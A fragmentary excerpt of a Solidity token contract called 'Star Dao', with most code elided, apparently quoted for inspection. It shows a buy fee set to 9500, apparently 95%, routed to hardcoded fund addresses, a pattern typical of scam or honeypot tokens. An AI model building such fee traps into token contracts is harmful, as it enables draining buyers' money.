...
abstract contract AbsToken is IERC20, Ownable {
    ...
    uint256 public airDropNumbs = 1; //自动空投数量
    uint256 public _buyFundFee = 9500;
    ...
    function swapTokenForFund(uint256 tokenAmount, uint256 swapFee) private lockTheSwap {
        ...
        address secFundAddress = 0xb2aA0c30402AdFFCc779a7e783eA32FC1CE3900D;
...
contract Token is AbsToken {
    constructor() AbsToken(
        address(0x10ED43C718714eb63d5aA57B78B54704E256024E),//Route
        address(0x55d398326f99059fF775485246999027B3197955),//池子代币
        "Star Dao",
        "Star Dao",
        6,
        10000000,
        address(0x57257d83da94263aBDE2FaD7989e159cFdF17635),
        address(0x8045560349464C8d98f1bC16d17b02bAAcaE5654)
    ){
